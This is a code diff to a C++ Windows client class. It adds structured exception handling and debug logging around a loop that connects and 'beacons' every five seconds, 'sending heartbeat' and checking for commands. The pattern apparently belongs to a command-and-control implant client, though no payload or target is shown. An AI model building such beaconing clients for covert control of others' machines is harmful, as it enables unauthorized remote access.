@@ -31,7 +31,6 @@ Client::Client() :
 	)
 {
 	messageHandler_.setTransportLayer(*transportLayerPtr_);
-	std::cout << "inside default constructor for client" << std::endl;
 }
 
 Client::Client(
@@ -59,7 +58,6 @@ Client::Client(
 
 Client::~Client()
 {
-	std::cout << "Client being deconstructed" << std::endl;
 }
 
 bool Client::run()
@@ -80,22 +78,30 @@ bool Client::run()
 
 	*/
 
-
-	while (true)
+	__try
 	{
-		if (!transportLayerPtr_->isConnected())
+		while (true)
 		{
-			transportLayerPtr_->connect();    // Try to connect (handles if already connected)
-		}
-		
-		if (transportLayerPtr_->isConnected())
-		{
-			transportLayerPtr_->beacon();     // Send heartbeat + check commands... also receive() is called inside beacon
-			//transporter_.receive();
-			//transporter_.sendMessage();
-		}
+			if (!transportLayerPtr_->isConnected())
+			{
+				transportLayerPtr_->connect();
+			}
 
-		Sleep(5000);            // Wait 5 seconds
+			if (transportLayerPtr_->isConnected())
+			{
+				transportLayerPtr_->beacon();
+			}
+			std::cout << "before sleeping" << std::endl;
+			Sleep(5000);
+			std::cout << "after sleeping" << std::endl;
+		}
 	}
+	__except (EXCEPTION_EXECUTE_HANDLER)
+	{
+		std::cout << "CRITICAL: Exception in main loop: 0x" << std::hex << GetExceptionCode() << std::dec << std::endl;
+		// Try to reconnect or restart
+		return false;
+	}
+
 	return false;
 }
